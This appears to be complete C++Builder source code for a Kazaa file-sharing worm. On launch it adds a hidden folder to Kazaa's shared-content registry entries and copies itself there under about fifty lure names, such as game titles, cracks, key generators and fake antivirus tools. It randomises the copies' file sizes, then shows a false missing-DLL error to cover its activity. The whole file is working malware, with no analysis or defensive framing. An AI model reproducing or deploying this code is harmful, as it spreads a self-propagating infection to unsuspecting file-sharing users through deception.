   //---------------------------------------------------------------------------
   #include <vcl.h>
   #include <Registry.hpp>
   #pragma hdrstop
   #include "VB.h"
   #include "stdlib.h"
   #include "stdio.h"
   #include "io.h"
   #include "fcntl.h"
   //---------------------------------------------------------------------------
   #pragma package(smart_init)
   #pragma resource "*.dfm"
   TForm1 *Form1;
   //---------------------------------------------------------------------------
   __fastcall TForm1::TForm1(TComponent* Owner)
           : TForm(Owner)
   {
   }
   //---------------------------------------------------------------------------

   AnsiString SysConfigDir = "C:\\Windows\\Kazaa";

   AnsiString Fake[50];

   char *FakeFiles[97] = {
                            "CKY3 - Bam Margera World Industries Alien Workshop",
                            "Cat Attacks Child",
                            "Windows XP",
                            "AIM Account Stealer",
                            "MSN Password Hacker and Stealer",
                            "Hacking Tool Collection",
                            "Macromedia Flash 5.0",
                            "DSL Modem Uncapper",
                            "Internet and Computer Speed Booster",
                            "ZoneAlarm Firewall",
                            "Borland Delphi 6",
                            "BORLAND Delphi 7",
                            "Shakira",
                            "Gladiator",
                            "AikaQuest3Hentai",
                            "MoviezChannelsInstaler",
                            "Zidane-ScreenInstaler",
                            "LordOfTheRingsr",
                            "SIMS",
                            "Quake 4 BETA",
                            "Xbox.info",
                            "GTA3",
                            "Battle.net",
                            "Warcraft 3 battle.net",
                            "Half-life WON",
                            "Winzip 8.0",
                            "Winrar 3.2",
                            "Warcraft 3 ONLINE",
                            "Half-life ONLINE",
                            "Grand Theft Auto 3",
                            "Macromedia",
                            "KaZaA Media Desktop v2.5 UNOFFICIAL",
                            "KaZaA Spyware Remover",
                            "Age Of Empires 2",
                            "Norton AntiVirus 2002",
                            "Macromedia Dreamweaver MX",
                            "Microsoft Office XP (English)",
                            "CloneCD",
                            "Windows XP SP1",
                            "The Neverending Story Part I",
                            "Free Virus Removal Tool From Symantec",
                            "The Sun Of All Fears",
                            "Crazy Taxi",
                            "Duke Nukem Manhattan Project",
                            "Industry Giant 2",
                            "F1 Grand Pix 4",
                            "Star Wars II Movie",
                            "Nero Burning Rom 5.8.0.1",
                            "Need For Speed 5 Porsche Unleashed",
                            "Half Life Blue Shift",
                            "Quake 3 Arena",
                            "Warcraft 3",
                            "Civilization 3",
                            "Black And White",
                            "Strike Fighter Project 1",
                            "Mafia",
                            "The Eye Of Kraken",
                            "Hoyle Card Games 2003",
                            "GTA 3",
                            "Hard Truck 18 Wheels of Steel",
                            "Comanche 4",
                            "Grand Prix 4",
                            "Age of Sail 2",
                            "Sudden Strike 2",
                            "Neverwinter Nights",
                            "Soldier Of Fortune 2",
                            "Valhalla Chronicles",
                            "International Cricket Captain 2003",
                            "Critical Point Manga game",
                            "Elder Scrolls III Morrowind THX Brrbrr",
                            "Unreal Tournament 3",
                            "Aliens versus Predator 2 Primal Hunt",
                            "Star Wars Starfighter",
                            "Norton Utilities 2002 XP",
                            "Hitman 2 Silent Assassin",
                            "MS Train Simulator",
                            "Cabelas Ultimate Deer Hunt 2",
                            "Dweebs 2",
                            "Age Of Wonders 2",
                            "Austerlitz Napoleons Greatest Victory",
                            "Emperor Rise Of the Middle Kingdom",
                            "Necromania Trap Of Darkness",
                            "Prisoner Of War",
                            "Squad Battles Eagles Strike",
                            "Stronghold Crusader",
                            "Tomb Raider 3",
                            "Deadly Dozen",
                            "Empire Earth",
                            "Freedom Force",
                            "Gearhead Garage",
                            "Red Ace Squadron",
                            "Clive Barker’s Undying",
                            "The Thing",
                            "Dark Age Of Camelot Shrouded Isles",
                            "Combat Flight Simulator 3",
                            "Soldiers Of Anarchy",
                            "FIFA 2003"
                         };

   char *Addon[6] = {
                            "Crack",
                            "Patch",
                            "Key Generator",
                            "Full Downloader",
                            "ISO - Full Downloader",
                            "Downloader"
                     };

   //---------------------------------------------------------------------------

   void RandomFileName()
   {
     AnsiString s;
     int i,j;
     bool doub;
     for (i=1;i<50;i++) Fake[i]="";
     i=1;
     do
     {
       doub=false;
       s=FakeFiles[random(96)];
       s=s+" "+Addon[random(5)]+".exe";
       for (j=1;j<i;j++) if (s==Fake[j]) doub=true;
       Fake[i]=s;
       if (doub==false) i++;
     }
     while (i<50);
   }
   //---------------------------------------------------------------------------

   void ManipulateFileSize(AnsiString SharedDir)
   {
     int RandomBytes[1000];
     long i;
     AnsiString s;
     long o;
     char *x;
     FILE *FakeFile;
     int Handle;
     for (i=1;i<1000;i++) RandomBytes[i]=random(255);
     for (i=1;i<50;i++)
     {
       s=SharedDir+"\\"+Fake[i];
       if (FileExists(s))
       {
         Handle=open(s.c_str(),O_RDWR);
         chsize(Handle,36352+random(10000));
         fclose(FakeFile);
       }
     }
   }
   //---------------------------------------------------------------------------

   void MakeFakeFiles(AnsiString SharedDir)
   {
     long I;
     int p;
     AnsiString e,f;
     if (SharedDir!="")
     {
       RandomFileName();
       CreateDir(SharedDir);
       for (I=0;I<50;I++)
       {
         e=ParamStr(0);
         f=SharedDir+"\\"+Fake[I];
         CopyFile(e.c_str(),f.c_str(),false);
       }
       ManipulateFileSize(SharedDir);
     }
   }
   //---------------------------------------------------------------------------

   bool __fastcall FindKazaa()
   {
     bool k = false;
     TRegistry *Registry = new TRegistry(KEY_READ);
     Registry->RootKey = HKEY_CURRENT_USER;
     k=Registry->KeyExists("Software\\Kazaa");
     Registry->CloseKey();
     delete Registry;
     return k;
   }
   //---------------------------------------------------------------------------

   AnsiString KazaaShare()
   {
     AnsiString Dir, s, WinPath;
     long I=0;
     TRegistry *Registry = new TRegistry;
     Registry->RootKey = HKEY_CURRENT_USER;
     Registry->OpenKey("\\Software\\Kazaa\\LocalContent\\",true);
     do
     {
       Dir=IntToStr(I);
       Dir="Dir"+Dir;
       I++;
       s="";
       if (Registry->ValueExists(Dir)) s=Registry->ReadString(Dir);
     }
     while ((s!="")&(s.Pos(SysConfigDir)==0));
     if (s=="") Registry->WriteString(Dir,"012345:"+WinPath+SysConfigDir);
     Registry->CloseKey();
     delete Registry;
     return WinPath+SysConfigDir;
   }
   //---------------------------------------------------------------------------

   void __fastcall TForm1::FormCreate(TObject *Sender)
   {
   {
     AnsiString k = "Positron Positron Positron Positron Positron Positron Positron";
     Randomize;
     KazaaShare();
     MakeFakeFiles(SysConfigDir);
     Application->MessageBox("Can not find MSVBDLL32.DLL", "ERROR", MB_OK);
     exit(EXIT_SUCCESS);
   }
   }
   //---------------------------------------------------------------------------
